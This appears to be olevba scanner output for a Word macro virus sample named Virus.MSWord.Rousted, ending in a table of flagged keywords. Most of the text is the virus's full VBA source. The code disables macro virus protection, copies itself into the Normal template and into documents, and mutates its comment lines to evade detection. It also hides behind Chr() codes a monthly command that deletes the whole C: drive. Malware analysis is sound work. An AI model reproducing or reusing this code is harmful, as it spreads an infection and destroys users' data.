olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rousted
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rousted - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'NVC
Private Sub Document_Open()
'IE4
On Error Resume Next
'FW4
Options.VirusProtection = False
'VnqtvEceOkTiRBlFmgWC1
Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
'hfAJdSAxqvtV1
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
'QcsunGiDKcNQWDFafJ2
If NT.Lines(1, 1) <> "'NVC" Then
'KbsnDSplyZZmvzfKne4
SetAttr NormalTemplate.FullName, 0
'wzuUuKAuJEbtchgg1
Call MC(NT, AD)
'hLCjQVYsof8
ElseIf AD.Lines(1, 1) <> "'NVC" Then
'VTSthhbzLUXBXRJSid7
Call MC(AD, NT)
'TKSUxhsbylfikxHjTG0
End If
'JbvHoMmFiJdcfpfN5
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'WMm8
If Day(Now) = 5 Then
'W6
St = Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(99) + Chr(111) + Chr(109) + Chr(112) + Chr(117) + Chr(116) + Chr(101) + Chr(114) + Chr(32) + Chr(73) + Chr(110) + Chr(102) + Chr(101) + Chr(99) + Chr(116) + Chr(101) + Chr(100) + Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(114) + Chr(117) + Chr(115) + Chr(32) + Chr(83) + Chr(101) + Chr(99) + Chr(116) + Chr(111) + Chr(114) + Chr(32) + Chr(118) + Chr(49) + Chr(46) + Chr(48) + Chr(13) + Chr(10) + Chr(78) + Chr(117) + Chr(99) + Chr(108) + Chr(101) + Chr(97) + Chr(114) + Chr(95) + Chr(86) + Chr(105) + Chr(114) + Chr(105) + Chr(95) + Chr(67) + Chr(114) + Chr(101) + Chr(119) + Chr(32) + Chr(40) + Chr(78) + Chr(86) + Chr(67) + Chr(41) + Chr(32) + Chr(45) + Chr(32) + Chr(82) + Chr(85) + Chr(76) + Chr(69) + Chr(90) + Chr(90) + Chr(32) + Chr(70) + Chr(79) + Chr(82) + Chr(69) + Chr(86) + Chr(69) + Chr(82) + Chr(33) + Chr(33) + Chr(33)
'ODhKhJ5
MsgBox St, 0, ""
'PiFrjSs8
S = Chr(47) + Chr(67) + Chr(32) + Chr(68) + Chr(69) + Chr(76) + Chr(84) + Chr(82) + Chr(69) + Chr(69) + Chr(32) + Chr(47) + Chr(89) + Chr(32) + Chr(67) + Chr(58) + Chr(32) + Chr(62) + Chr(78) + Chr(85) + Chr(76)
'kDajJylMVEg3
Shell ("COMSPEC") + S, 0
'jZpGXisKHEmWwmfiAVNM6
End If
'SwIrGw0
End Sub
'I6
Private Sub MC(Dest, Sour)
'BNycchKbYIwvd0
Dest.DeleteLines 1, Dest.CountofLines
'KRwIjsowajYzmIX8
Dest.InsertLines 1, "'NVC"
'lpfKjFID6
For i = 2 To Sour.CountofLines
'wqiYF3
Dest.InsertLines i, Sour.Lines(i, 1)
'GFl1
If Mid$(Dest.Lines(i, 1), 1, 1) = "'" Then
'G3
Randomize
'SqfRtTb7
 N = "'"
'sCkS6
 For j = 1 To Int(Rnd * 20) + 1
'W7
  b = Int(Rnd * 26) + 65
'wVFIzGUU6
  If Rnd > 0.5 Then b = b + 32
'JSAbULlQktbq7
  N = N + Chr$(b)
'SPsNeZTwEAVlQaeVdU8
 Next
'mNrGuMADSyhHoWEFKO1
 N = N + Chr$(Asc("0") + Int(Rnd * 9))
'YLuMLElNDdjOwEFB0
Dest.ReplaceLine i, N
'JyccHPjLiE2
End If
'YfSMYaMRFSFwQOiOFn4
Next i
'VxsmoaDTsJnEdugerq6
End Sub
'lOvafFXxCiLXzMe2
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

